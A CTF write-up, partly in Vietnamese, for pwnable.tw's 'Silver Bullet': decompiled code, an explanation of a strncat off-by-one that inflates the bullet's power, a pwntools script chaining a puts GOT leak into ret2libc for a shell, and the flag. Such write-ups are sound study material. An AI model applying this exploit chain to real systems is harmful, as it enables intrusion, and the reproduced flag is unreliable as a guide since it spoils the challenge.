# Silver Bullet 

## ida 

- main


```c 
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v3; // eax
  int Werewolf[2]; // [esp+0h] [ebp-3Ch] BYREF
  char bullet[48]; // [esp+8h] [ebp-34h] BYREF
  int v7; // [esp+38h] [ebp-4h]

  init_proc();
  v7 = 0;
  memset(bullet, 0, sizeof(bullet));
  Werewolf[0] = 2147483647;
  Werewolf[1] = (int)"Gin";
  while ( 1 )
  {
    while ( 1 )
    {
      while ( 1 )
      {
        while ( 1 )
        {
          menu();
          v3 = read_int();
          if ( v3 != 2 )
            break;
          power_up(bullet);
        }
        if ( v3 > 2 )
          break;
        if ( v3 != 1 )
          goto LABEL_15;
        create_bullet(bullet);
      }
      if ( v3 == 3 )
        break;
      if ( v3 == 4 )
      {
        puts("Don't give up !");
        exit(0);
      }
LABEL_15:
      puts("Invalid choice");
    }
    if ( beat((int)bullet, (int)Werewolf) )
      return 0;
    puts("Give me more power !!");
  }
}
``` 

- create_bullet

```c 
int __cdecl create_bullet(char *bullet)
{
  unsigned int size; // [esp+0h] [ebp-4h]

  if ( *bullet )
    return puts("You have been created the Bullet !");
  printf("Give me your description of bullet :");
  read_input(bullet, 48u);
  size = strlen(bullet);
  printf("Your power is : %u\n", size);
  *((_DWORD *)bullet + 12) = size;
  return puts("Good luck !!");
}
``` 

- power_up

```c 
int __cdecl power_up(char *bullet)
{
  char power[48]; // [esp+0h] [ebp-34h] BYREF
  size_t size; // [esp+30h] [ebp-4h]

  size = 0;
  memset(power, 0, sizeof(power));
  if ( !*bullet )
    return puts("You need create the bullet first !");
  if ( *((_DWORD *)bullet + 12) > 47u )
    return puts("You can't power up any more !");
  printf("Give me your another description of bullet :");
  read_input(power, 48 - *((_DWORD *)bullet + 12));
  strncat(bullet, power, 48 - *((_DWORD *)bullet + 12));
  size = strlen(power) + *((_DWORD *)bullet + 12);
  printf("Your new power is : %u\n", size);
  *((_DWORD *)bullet + 12) = size;
  return puts("Enjoy it !");
}
``` 

- beat

```c 
int __cdecl beat(int bullet, int Werewolf)
{
  if ( *(_BYTE *)bullet )
  {
    puts(">----------- Werewolf -----------<");
    printf(" + NAME : %s\n", *(const char **)(Werewolf + 4));
    printf(" + HP : %d\n", *(_DWORD *)Werewolf);
    puts(">--------------------------------<");
    puts("Try to beat it .....");
    usleep(0xF4240u);
    *(_DWORD *)Werewolf -= *(_DWORD *)(bullet + 48);
    if ( *(int *)Werewolf <= 0 )
    {
      puts("Oh ! You win !!");
      return 1;
    }
    else
    {
      puts("Sorry ... It still alive !!");
      return 0;
    }
  }
  else
  {
    puts("You need create the bullet first !");
    return 0;
  }
}
```

## Analysis and Exploit
- chall cho ta 3 option, 1 là tạo 1 bullet, 2 là tăng dame cho bullet , 3 là đánh boss, cuối cùng là exit
- tại option 1 tạo cho ta bullet có dame bằng strlen() ta nhập vào, tối đa là 48
- option 2 cho phép ta nhập thêm dame rồi nối chuỗi với bullet bằng hàm strncat(), tối đa là 48 - bullet 
- option 3 là lấy dame ta có đi đánh boss, boss có name là "GIN" và heap = 2147483647, nhưng mà dame tối đa cho ta chỉ có  48 thì đánh đến bao giờ mới chết boss
- nếu đọc sơ qua mà ko debug thì rất khó thấy bug trong chall này
- bug nhằm ở hàm strncat() vì sau khi nỗi chuỗi xong thì hàm sẽ cho thêm 1 byte null ở cuối => off byte one
- ta debug thử xem sao , lần đầu ta nhập 30byte a, sau đó ta nhập 18byte, lúc này xuất hiện bug off byte one rồi ta nhập thêm 4 byte xem ntn 

![image](https://github.com/gookoosss/CTF/assets/128712571/67bc9826-2ccb-47f5-84c6-0cd19da253e0)

![image](https://github.com/gookoosss/CTF/assets/128712571/cef257c4-fd80-4bf8-91e6-e0c94cd76745)


- xuất hiện 1 byte lạ là '%' và dame của ta tăng đột ngột lên 1633771813, lúc này thì thừa sức đánh boss rồi
- giết được boss rồi thì ta chỉ cần ret2libc như bình thường là lấy được shell 

![image](https://github.com/gookoosss/CTF/assets/128712571/3e67d9c1-6c76-4c9f-a535-d0e626f8eb3b)

## script 

```python 
#!/usr/bin/env python3

from pwn import *

exe = ELF("./silver_bullet_patched")
libc = ELF("./libc_32.so.6")
ld = ELF("./ld-2.23.so")

context.binary = exe
p = remote('chall.pwnable.tw', 10103)
p = process([exe.path])

gdb.attach(p, gdbscript = '''
b*0x08048a19
b*0x08048924
c
''')

input()

p.sendlineafter(b'choice :', b'1')
p.sendlineafter(b'bullet :', b'a'*30) 
p.sendlineafter(b'choice :', b'2')
p.sendlineafter(b'bullet :', b'a'*18) 
p.sendlineafter(b'choice :', b'2')


pop_edi_ebp = 0x08048a7a 
payload = b'a'*7 + p32(exe.plt.puts) + p32(exe.sym.main) + p32(exe.got.puts)
p.sendlineafter(b'bullet :', payload)
p.sendlineafter(b'choice :', b'3')
p.sendlineafter(b'choice :', b'3')
p.recvuntil(b'Oh ! You win !!\n')
libc_leak = u32(p.recv(4))
libc.address  = libc_leak - 0x5f140
print(hex(libc_leak))
print(hex(libc.address))

p.sendlineafter(b'choice :', b'1')
p.sendlineafter(b'bullet :', b'a'*30) 
p.sendlineafter(b'choice :', b'2')
p.sendlineafter(b'bullet :', b'a'*18) 
p.sendlineafter(b'choice :', b'2')
payload = b'a'*7 + p32(libc.sym.system) + p32(next(libc.search(b'/bin/sh\0'))) + p32(next(libc.search(b'/bin/sh\0')))
p.sendlineafter(b'bullet :', payload)
p.sendlineafter(b'choice :', b'3')
p.sendlineafter(b'choice :', b'3')
p.interactive()

# FLAG{uS1ng_S1lv3r_bu1l3t_7o_Pwn_th3_w0rld}
```

## Flag 

FLAG{uS1ng_S1lv3r_bu1l3t_7o_Pwn_th3_w0rld}
